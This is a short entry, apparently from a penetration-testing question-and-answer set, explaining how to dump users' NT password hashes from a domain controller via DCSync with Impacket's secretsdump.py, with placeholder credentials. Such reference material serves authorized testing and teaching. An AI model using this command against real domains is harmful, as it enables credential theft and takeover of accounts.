@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you retrieve NT hashes for users using DCSync?
+
+CONTEXT:
+You have the necessary permissions to perform a DCSync.
+
+METHOD / ANSWER:
+Command: `secretsdump.py <username>:<password>@<target>`
+Explanation: Use this command to dump NT hashes for users from the domain controller.
